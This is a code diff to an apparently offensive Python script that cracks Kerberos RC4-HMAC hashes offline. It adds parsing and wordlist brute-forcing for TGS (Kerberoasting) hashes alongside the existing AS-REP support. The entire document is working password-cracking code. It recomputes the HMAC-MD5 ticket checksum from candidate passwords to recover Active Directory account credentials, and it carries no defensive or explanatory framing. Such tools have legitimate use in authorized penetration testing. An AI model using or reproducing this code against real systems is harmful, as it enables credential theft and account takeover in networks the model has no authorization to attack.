@@ -29,20 +29,37 @@ def parse_asrep_hash(asrep_hash):
     if len(parts) != 5 or parts[1] != 'krb5asrep' or parts[2] != '23':
         raise ValueError("Invalid AS-REP hash format.")
 
-    user_realm = parts[3].split(':')[0]
     checksum = unhexlify(parts[3].split(':')[1])
     encrypted_data = unhexlify(parts[4])
     
     return {
-        'user_realm': user_realm,
         'checksum': checksum,
         'encrypted_data': encrypted_data
     }
 
-def verify_asrep(password, asrep_hash):
-    """Verifies if the provided password matches the given AS-REP hash."""
-    data = b'\x08\x00\x00\x00'  # Constant 4-byte input for HMAC-MD5
-    parsed_hash = parse_asrep_hash(asrep_hash)
+def parse_tgs_hash(tgs_hash):
+    """Parses the TGS hash and extracts components."""
+    parts = tgs_hash.split('$')
+    if len(parts) != 8 or parts[1] != 'krb5tgs' or parts[2] != '23':
+        raise ValueError("Invalid TGS hash format.")
+
+    checksum = unhexlify(parts[6])
+    encrypted_data = unhexlify(parts[7])
+
+    return {
+        'checksum': checksum,
+        'encrypted_data': encrypted_data
+    }
+
+
+def verify_hash(password, hash, hash_type):
+    """Verifies if the provided password matches the given AS-REP/TGS hash."""
+    if hash_type == 'asrep':
+        data = b'\x08\x00\x00\x00'  # Constant 4-byte input for HMAC-MD5
+        parsed_hash = parse_asrep_hash(hash)
+    else:
+        data = b'\x02\x00\x00\x00'  # Constant 4-byte input for HMAC-MD5
+        parsed_hash = parse_tgs_hash(hash)
 
     # Step 1: Convert password to UTF-16LE and compute the RC4-HMAC key
     password_utf16 = utf16le_encode(password)
@@ -66,14 +83,18 @@ def verify_asrep(password, asrep_hash):
     # Step 7: Compare the computed checksum with the original checksum (edata1)
     return computed_checksum[:16] == parsed_hash['checksum']
 
-def bruteforce_asrep(wordlist: str, hash: str):
+def bruteforce_asrep(wordlist, hash):
     with open(wordlist, 'r') as wordlist:
         for line in wordlist:
             password = line.strip()
-            if verify_asrep(password, hash):
+            if verify_hash(password, hash, 'asrep'):
                 return password
         return None
 
-
-
-
+def bruteforce_tgs(wordlist, hash):
+    with open(wordlist, 'r') as wordlist:
+        for line in wordlist:
+            password = line.strip()
+            if verify_hash(password, hash, 'tgs'):
+                return password
+        return None
